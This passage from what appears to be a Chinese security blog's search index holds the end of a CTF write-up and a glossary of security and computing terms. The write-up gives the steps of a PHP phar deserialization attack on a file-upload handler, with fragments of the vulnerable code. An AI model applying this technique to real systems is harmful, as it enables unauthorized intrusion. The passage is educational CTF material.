class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="comment">#file_get_contents和echo都会触发tostring方法，所以实质上$uploader就等价于$filename</span></span><br><span class="line"><span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一次上传文件，没有回显，因为这时候name没有赋值，所以filename&#x3D;$sandbox.$_SESSION[‘user’].$ext，而且因为第一次还没触发destruct方法，所以上传的文件实质上是在tmp目录，因此<code>echo file_get_contents($uploader)</code>为空</p><p>第二次文件上传时，第一次结束触发destruct方法，就会把上一次上传的文件移到$filename路径，所以就会输出上一次上传的文件的内容。</p></blockquote><p>第一次随便上传文件，获取<code>$_SESSION[&#39;user&#39;]</code>，用于绕过</p><p>第二次上传phar文件</p><p>第三次用name参数用phar协议访问phar文件，通过<code>file_get_contents($uploader)</code>触发反序列化完成攻击</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机名词解释</title>
      <link href="/2023/05/30/%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/05/30/%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="常见名词解释"><a href="#常见名词解释" class="headerlink" title="常见名词解释"></a>常见名词解释</h1><table><thead><tr><th align="center">名词</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">0day(Zero-day)</td><td align="center">没有补丁的安全漏洞</td></tr><tr><td align="center">Nday</td><td align="center">官方发布了补丁，但该漏洞仍然大量未修复，存在一定可利用性</td></tr><tr><td align="center">POC</td><td align="center">一段无害的用来证明漏洞存在的代码</td></tr><tr><td align="center">EXP（exploit）</td><td align="center">一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码</td></tr><tr><td align="center">payload（有效载荷）</td><td align="center">指成功 exploit 之后，真正在目标系统执行的代码或指令</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities &amp; Exposures 公共漏洞和暴露      CVE编号–漏洞标签</td></tr><tr><td align="center">ShellCode</td><td align="center">一段16进制机器码，可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，从而执行任意指令，EIP<code>寄存器，它里面存放的值是</code>CPU<code>下次要执行的指令地址，因此可以通过修改</code>EIP<code>寄存器的值来执行</code>shellcode</td></tr><tr><td align="center">FUZZ</td><td align="center">模糊测试：随机输入，观察输</td></tr><tr><td align="center">CMS</td><td align="center">内容管理系统：指的是一种内容编辑程序。就像在博客写文章一样，不需要懂得编程的人，也可以通过CMS发布，更改，管理内容。</td></tr><tr><td align="center">CNVD</td><td align="center">China National Vulnerability Database                                   国家信息安全漏洞共享平台</td></tr><tr><td align="center">Rootkit</td><td align="center">载入到操作系统内核中的恶意软件，具有root权限</td></tr><tr><td align="center">WAF</td><td align="center">Web应用防火墙，具有针对 HTTP&#x2F;HTTPS 的安全策略</td></tr><tr><td align="center">堡垒机</td><td align="center">监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</td></tr><tr><td align="center">彩虹表</td><td align="center">空间换时间，通过哈希碰撞破解哈希值</td></tr><tr><td align="center">供应链攻击</td><td align="center">攻击软件供应商，如向更新程序中注入木马</td></tr><tr><td align="center">沙箱</td><td align="center">虚拟系统程序：     在隔离环境中，用以测试不受信任的文件或应用程序等行为的工具</td></tr><tr><td align="center">域名泛解析</td><td align="center"><code>*.a.com</code>指向同一IP</td></tr><tr><td align="center">OSINT</td><td align="center"><strong>公开来源情报</strong>（OSINT, Open Source INTelligence）是从公开来源收集到的情报</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="蠕虫、病毒之间的区别"><a href="#蠕虫、病毒之间的区别" class="headerlink" title="蠕虫、病毒之间的区别"></a>蠕虫、病毒之间的区别</h1><p><img src="/../images/image-20230518203842099.png" alt="image-20230518203842099"></p><h1 id="token-x2F-cookie-x2F-session"><a href="#token-x2F-cookie-x2F-session" class="headerlink" title="token&#x2F;cookie&#x2F;session"></a>token&#x2F;cookie&#x2F;session</h1><p><a href="https://www.bilibili.com/video/BV1ob4y1Y7Ep">https://www.bilibili.com/video/BV1ob4y1Y7Ep</a></p><ol><li><p>cookie</p><ul><li><p>产生的原因</p><p>因为http是无状态协议，假设我以khaz的身份去访问服务器，等到下一次我再次访问服务器时，服务器还是不知道我是谁，我仍需要向服务器提交数据说明我是khaz。这样就导致了在同一个网站下我每次访问一个服务都需要提交一次数据，很麻烦。</p></li><li><p>本质</p><p>浏览器存储技术，实现每次HTTP请求都自动提交数据给服务器的技术。</p></li><li><p>机制</p><p>当用户第一次登录后，服务器返回的response中会有一个set-cookie字段，当我们的浏览器接收到response后，就会将set-cookie中的值保存到cookie中，然后每次我们登陆时浏览器就会自动在请求中为我们带上cookie，服务端接收后去数据库中核实cookie信息。</p></li><li><p>实例</p><p>通常，我们可以从很多网站的登录界面中看到“请记住我”这样的选项，如果你勾选了它之后再登录，那么在下一次访问该网站的时候就不需要进行重复而繁琐的登录动作了，而这个功能就是通过Cookie实现的。</p></li></ul></li><li><p>session</p><ul><li><p>产生的原因</p><p>因为cookie是保存在浏览器中的，用户可以随意查看和修改很不安全。</p></li><li><p>本质</p><p>一种概念。让HTTP从无状态连接变为有状态连接（会话状态）。</p></li><li><p>机制</p><p>当用户第一次登录后，服务端会在内存中生成session对象用于保存用户信息，同时通过set-cookie字段将session-id保存到浏览器中。在会话的有效期内，客户端每次请求都会带上session-id，服务端根据session-id找到对应的session，核实用户的身份。</p><blockquote><p>注：会话的有效期是通过设置cookie的有效期实现的。</p></blockquote></li></ul></li><li><p>token</p><ul><li><p>产生的原因</p><p>因为session的机制，服务端需要在内存中保存session，就会出现一些问题。例如：</p><ul><li>大量session对象的存储带来的内存消耗</li><li>各服务器之间session的复制</li><li>专门用于存储session的服务器宕机</li></ul></li><li><p>本质</p><p>身份令牌</p></li><li><p>机制</p><p>当用户第一次登陆后，服务端会生成一个token令牌。通过 set-cookie字段保存到浏览器中。</p><p>在令牌的有效期内，客户端每次请求都会带上token令牌，服务端通过保存的密钥验证签名来核对用户身份。</p></li><li><p>实例</p><p> json web token，JWT</p><p>总结</p><blockquote><p>cookie：</p><p>客户端保存，服务端不保存。</p><p>session：</p><p>客户端只保存session-id，服务端保存session对象。</p><p>token：</p><p>客户端保存token，服务端只保存token签名的密钥。</p></blockquote></li></ul></li></ol><h1 id="正向-x2F-反向代理"><a href="#正向-x2F-反向代理" class="headerlink" title="正向&#x2F;反向代理"></a>正向&#x2F;反向代理</h1><p><a href="https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/">https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/</a></p><ul><li><p>正向代理</p><blockquote><p>转发代理，通常称为代理、代理服务器或 Web 代理，是位于一组客户端计算机之前的服务器,确保没有源站直接与该特定客户端通信</p></blockquote><p><img src="/../images/forward-proxy-flow.svg" alt="正向代理流"></p></li></ul><p>​        在标准的互联网通信中，计算机 A 将直接与计算机 C 保持联系，客户端将请求发送到<a href="https://www.cloudflare.com/learning/cdn/glossary/origin-server/">源服务器</a>，并且源服务器将响应客户端。当存在正向&#x2F;转发代理时，A 将请求发送到 B，B 随后将请求转发给 C。C 将向 B 发送响应，而 B 则将响应转发给 A。</p><ul><li><p>反向代理</p><blockquote><p>反向代理是位于一个或多个 Web 服务器前面的服务器，拦截来自客户端的请求，确保没有客户端直接与该源站通信。</p></blockquote><p><img src="/../images/reverse-proxy-flow.svg" alt="反向代理流"></p></li></ul><p>​       通常，来自 D 的所有请求都将直接发送到 F，而 F 会直接将响应发送到 D。使用反向代理，来自 D 的所有请求都将直接发送给 E，而 E 会将其请求发送到 F 并从 F 接收响应，然后将适当响应传递给 D。</p><table><thead><tr><th align="left"></th><th>对象</th><th>优点</th></tr></thead><tbody><tr><td align="left">正向&#x2F;转发代理</td><td>客户端</td><td>匿名，绕过访问限制</td></tr><tr><td align="left">反向代理</td><td>服务端</td><td>更加安全，提高服务器性能</td></tr></tbody></table><h1 id="静态web和动态web"><a href="#静态web和动态web" class="headerlink" title="静态web和动态web"></a>静态web和动态web</h1><p><a href="https://help.dedecms.com/shiyongshouce/moshi/mingci.html">https://help.dedecms.com/shiyongshouce/moshi/mingci.html</a></p><p>伪静态即是网站本身是动态网页如.php、.asp、.aspx等格式动态网页有时这类动态网页还跟”?”加参数来读取数据库内不同资料，伪静态就是做url重写操作(即rewrite)。</p><p>demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">跳转需求：</span><br><span class="line">访问http:<span class="comment">//www.kevin.com/p/123456.html  跳转成  http://a.aa.com/p/123456</span></span><br><span class="line"></span><br><span class="line">配置如下:</span><br><span class="line">rewrite ^/p/(\d+).html    http:<span class="comment">//www.kevin.com/p/$1 last;</span></span><br><span class="line"></span><br><span class="line">解释说明：</span><br><span class="line">\d是数字的意思 +是最少一个&#123;<span class="number">1</span>,&#125; <span class="number">1</span>到无穷大&#123;<span class="number">1</span>,<span class="number">3</span>&#125; 这样是<span class="number">1</span>-<span class="number">3</span>位数。</span><br></pre></td></tr></table></figure><h1 id="DDOS攻击和CC攻击"><a href="#DDOS攻击和CC攻击" class="headerlink" title="DDOS攻击和CC攻击"></a>DDOS攻击和CC攻击</h1><p>DDoS攻击打的是网站的服务器，而CC攻击是针对网站的页面攻击的。</p><p>用术语来说就是，一个是WEB网络层拒绝服务攻击（DDoS），一个是WEB应用层拒绝服务攻击（CC）。</p><p>网络层就是利用肉鸡的流量去攻击目标网站的服务器，针对比较本源的东西去攻击（通信信道），服务器瘫痪了，那么运行在服务器上的网站肯定也不能正常访问了。</p><p>而应用层就是我们用户看得到的东西，就比如说网页，CC攻击就是针对网页来攻击的，CC攻击本身是正常请求，网站动态页面的正常请求也会和数据库进行交互的，当这种”正常请求”达到一种程度的时候，服务器就会响应不过来，从而崩溃。</p><h1 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a>彩虹表</h1><p><a href="https://zhuanlan.zhihu.com/p/105578739">https://zhuanlan.zhihu.com/p/105578739</a></p><p><strong>彩虹表</strong>(<code>rainbow table</code>)是一个用于<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0">加密散列函数</a>逆运算的预先计算好的<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E6%9F%A5%E6%89%BE%E8%A1%A8">表</a>，常用于破解加密过的密码散列。如MD5，SHA1.</p><p> 查找表常常用于包含有限字符固定长度<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E7%BA%AF%E6%96%87%E6%9C%AC">纯文本</a><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81">密码</a>的加密。</p><p>事先准备大量哈希链表：</p><p>X：随机生成的明文</p><p>H：哈希函数</p><p>R：自定义函数</p><p><img src="/../images/image-20220622152607746-1686284457479.png" alt="image-20220622152607746"></p><p>只保存开头和末尾位置即X和Rn。</p><p>对于经过H得到的密文C进行破解：首先使用R得到Y&#x3D;R（C），再将Y与Rn进行比较。</p><p>①如果相等，则说明密文C对应的明文P在哈希链表中的Rn-1处。原理见下图。</p><p><img src="/../images/image-20220622153058176-1686284457479.png" alt="image-20220622153058176"></p><p>②如果不相等，则说明密文C对应的明文P不在哈希链表中的Rn-1处。所以需要向前查找是否在Rn-2~R1处。</p><p>具体流程：对Y再用H和R函数，得到Y‘，与Rn比较，如果相等，则说明明文为Rn-2，如果不是，就重复步骤，直到所有哈希链表都查找过，说明破解失败。</p><p>防御手段：加密时使用盐值</p><h1 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h1><p><a href="https://cloud.tencent.com/developer/article/1688327">堆和栈的区别</a></p><blockquote><p>栈区保存声明的变量例如<code>int a=1</code>,由系统自动分配</p><p>堆区保存用户申请的变量例如<code>malloc</code>，<code>b=&amp;a</code></p><p>程序在编译变量和对函数分配内存都在栈上进行，且函数调用时参数的传递也是在栈上进行。</p></blockquote><h1 id="按值传递，按引用传递和按指针传递"><a href="#按值传递，按引用传递和按指针传递" class="headerlink" title="按值传递，按引用传递和按指针传递"></a>按值传递，按引用传递和按指针传递</h1><p><a href="https://www.junmajinlong.com/coding/pass_by_value_or_ref/">https://www.junmajinlong.com/coding/pass_by_value_or_ref/</a></p><ul><li><p>按值传递</p><blockquote><p>开辟新空间，将数据对象拷贝一份副本到新空间中</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="built_in">int</span> b=a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027160246647-1686284933113.png" alt="image-20221027160246647"></p><blockquote><p>这时候修改a或b的值，都不会影响另一个变量的值</p></blockquote></li><li><p>按引用传递</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b=a;</span><br></pre></td></tr></table></figure><blockquote><p>不开辟新空间，只是给数据对象所在空间名起了一个别名</p></blockquote><p><img src="/../images/image-20221027160357481-1686284933114.png" alt="image-20221027160357481"></p><blockquote><p>这时候修改a或b的值，应该会影响另一个变量的值，因为二者的地址是一样的。</p></blockquote></li><li><p>按指针传递</p><p>在c或c++可以操作指针的语言中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>* b=&amp;a;</span><br></pre></td></tr></table></figure><blockquote><p>在堆内存中开辟空间用来保存指针b，b指向a所在的地址（保存a的地址）。</p></blockquote><p><img src="/../images/image-20221027160713576-1686284933115.png" alt="image-20221027160713576"></p></li></ul><h1 id="阻塞和非阻塞，同步和异步"><a href="#阻塞和非阻塞，同步和异步" class="headerlink" title="阻塞和非阻塞，同步和异步"></a>阻塞和非阻塞，同步和异步</h1><p>是node.js里经常遇到的词汇，我举个简单的例子来说明：</p><p>我要看足球比赛，但是妈妈叫我烧水，电视机在客厅，烧水要在厨房。家里有2个水壶，一个是普通的水壶，另一个是水开了会叫的那种水壶。我可以：</p><ol><li>用普通的水壶烧，人在边上看着，水开了再去看球。<strong>（同步，阻塞）</strong>这个是常规做法，但是我看球不爽了。</li><li>用普通水壶烧，人去看球，隔几分钟去厨房看看。<strong>（同步，非阻塞）</strong>这个又大问题，万一在我离开的几分钟水开了，我就麻烦了。</li><li>用会叫的水壶，人在边上看着。<strong>（异步，阻塞）</strong>这个没有问题，但是我太傻了。</li><li>用会叫的水壶，人去看球，听见水壶叫了再去看。<strong>（异步，非阻塞）</strong>这个应该是最好的。</li></ol><p>等着看球的我：阻塞</p><p>看着电视的我：非阻塞</p><p>普通水壶：同步</p><p>会叫的水壶：异步</p><p>所以，异步往往配合非阻塞，才能发挥出威力。</p><h1 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h1><p><img src="/../images/MVC-1669639280429-1686284933115.png" alt="MVC"></p><h1 id="小端序和大端序"><a href="#小端序和大端序" class="headerlink" title="小端序和大端序"></a>小端序和大端序</h1><p><img src="/../images/image-20221209213725351.png" alt="image-20221209213725351"></p><h1 id="CGI与fastCGI"><a href="#CGI与fastCGI" class="headerlink" title="CGI与fastCGI"></a>CGI与fastCGI</h1><p><a href="https://www.cnblogs.com/tssc/p/10255590.html#_label4_4">关于CGI和FastCGI的理解 - 天生帅才 - 博客园</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
